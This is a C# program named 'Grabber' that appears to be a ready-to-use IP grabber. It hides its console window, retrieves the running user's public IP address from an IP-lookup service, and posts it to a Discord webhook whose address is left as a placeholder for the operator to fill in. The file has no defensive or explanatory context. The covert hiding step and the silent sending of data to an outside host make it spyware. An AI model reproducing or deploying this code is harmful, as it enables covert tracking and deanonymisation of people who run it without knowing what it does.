using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Grabber
{
    class Program
    {
        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hwnd, int cmdShow);
        static void Main(string[] args)
        {
            IntPtr hwnd = GetConsoleWindow();
            if(hwnd != IntPtr.Zero)
            {
                ShowWindow(hwnd, 0);
            }

            string html = string.Empty;
            string url = @"https://api.ipify.org";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.AutomaticDecompression = DecompressionMethods.GZip;

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                html = reader.ReadToEnd();
            }

            using (dWebHook dcWeb = new dWebHook())
            {
                dcWeb.ProfilePicture = "https://static.giantbomb.com/uploads/original/4/42381/1196379-gas_mask_respirator.jpg";
                dcWeb.UserName = "Bot";
                dcWeb.WebHook = "PASTE YOUR WEBHOOK INSIDE THESE DOUBLE QUOTES";
                dcWeb.SendMessage(html);
            }
        }
    }
}
